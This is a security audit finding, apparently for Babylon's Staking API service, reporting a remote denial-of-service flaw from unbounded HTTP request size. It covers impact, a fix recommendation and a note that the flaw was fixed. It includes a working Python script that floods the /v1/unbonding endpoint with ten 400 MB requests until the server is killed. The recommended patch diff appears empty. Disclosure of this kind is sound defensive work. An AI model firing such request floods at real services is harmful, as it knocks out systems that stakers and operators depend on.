# Staking API service can be crashed remotely due to unbounded size of request 

## Summary
The Staking API service, a critical component of Babylon, is vulnerable to a Denial of Service (DoS) attack. This is caused by the service not limiting the size of HTTP requests, allowing an attacker to send large requests multiple times and consume high amounts of memory from the server. This results in the server being killed by the operating system, preventing stakers from being able to stake. The likelihood of this attack is high as the Staking API service is publicly known. A proof of concept was run on a 32GB Linux Debian 12 machine, showing how the service can be crashed remotely. A recommendation is to use the RequestSize middleware to limit the size of requests. This has been fixed in PR 183, and it is advised to also enforce other common API security measures.

## Details
## Staking API Service Vulnerability Report

## Context
File: `server.go` (Lines 33-35)

## Description
The Staking API service is a critical component of Babylon. The README of the repository indicates:

The Staking API Service is a vital part of the Babylon Phase-1 system, focused on serving information about the state of the network and receiving unbonding requests for further processing. The API can be utilized by user-facing applications, such as staking dApps. 

The Staking API service does not cap the size of HTTP requests. An attacker may leverage this by creating a large HTTP request and sending it multiple times. This will lead to high memory consumption from the Staking API service process. 

On modern operating systems, when a process consumes too much memory resource, it is killed (default behavior). Therefore, the attacker is able to crash the Staking API service remotely.

### Impact
**High**: Stakers cannot complete staking operations due to the DoS attack, resulting in an inability for stakers to stake in Babylon.

### Likelihood
**High**: An attacker only needs to know the Staking API service, which is publicly known.

## Proof of Concept
(The following PoC was run on a 32GB Linux Debian 12 machine):

1. **Staking API service**: The covenant signer service must be running:
   ```bash
   make run-local
   ```

2. **Attacking Script**: A Python script was developed to demonstrate how the Staking API service can be crashed remotely. First, create a Python virtual environment and install dependencies:
   ```bash
   python3 -m venv localenv
   source localenv/bin/activate
   pip3 install grequests
   ```

3. Then, import the following attacking script into `exploit-dos-staking-api-service.py`:
   ```python
   import grequests
   
   url = 'http://127.0.0.1:8092/v1/unbonding'  # POC: the Staking API server
   post_data = {
       "staker_signed_signature_hex": "11223344" * 100000000,  # POC: 4 bytes * 100,000,000 = 400 MB per request
       "staking_tx_hash_hex": "unbonding_tx_hex",
       "unbonding_tx_hash_hex": "staker_unbonding_sig_hex",
       "unbonding_tx_hex": "covenant_public_key"
   }
   rs = [grequests.post(url, json=post_data) for i in range(10)]
   grequests.map(rs)
   ```

4. Finally, start the script:
   ```bash
   python3 exploit-dos-staking-api-service.py
   ```

### Results
Once the attack is started, the Staking API server will handle multiple large requests. The following result is printed on the Staking API server command line:

```json
{"level":"debug","path":"/v1/unbonding","traceId":"e2fa488b-bebd-4bbe-a8cc-93685ab63ee9","time":"2024-06-03T16:13:32+02:00","message":"request received"}
...
{"level":"info","path":"/v1/unbonding","traceId":"b07748f9-0a02-4a91-b7a0-aea06f2bb859","tracingInfo":{"SpanDetails":null},"requestDuration":3884,"time":"2024-06-03T16:13:36+02:00","message":"Request completed"}
```
The process has been killed by the operating system, as its memory consumption was too high.

### Tracking Process Memory
To better understand the crash, follow the memory consumption of the target process. Install the following python dependencies in a local environment:
```bash
pip3 install psrecord matplotlib tk
```
`psrecord` allows attaching to an existing process to monitor its memory consumption and create a graph of its usage. 

After running the Staking API service but before starting the attack, run the following command to follow and create a graph (PNG image) of the target process's memory consumption:
```bash
psrecord $(pgrep main) --interval 1 --plot memory-consumption.png
```
Note: The process `main` is used because the Makefile starts the command `go run`, which will execute the Staking API server with a binary named `main` in the path `/tmp/go-buildXXXXXXX/YYY/exe/main`.

During this proof of concept creation, a graph was obtained that showed a 14,000 MB memory consumption, which represents 14GB, before getting killed.

## Recommendation
Use the `RequestSize` middleware from the `Chi` dependency in the Staking API server. This middleware allows setting a maximum size for requests.

The following patch implements the integration of this middleware for the Staking API server. Please note that in this patch, the request size is limited to 524288 bytes. This value is arbitrary and may not fit Babylon's needs.

```diff
diff --git a/internal/api/server.go b/internal/api/server.go

--- a/internal/api/server.go
+++ b/internal/api/server.go
```

Babylon: Fixed in PR 183. It is recommended that the deployment is configured to enforce common API security measures, including request size limits.
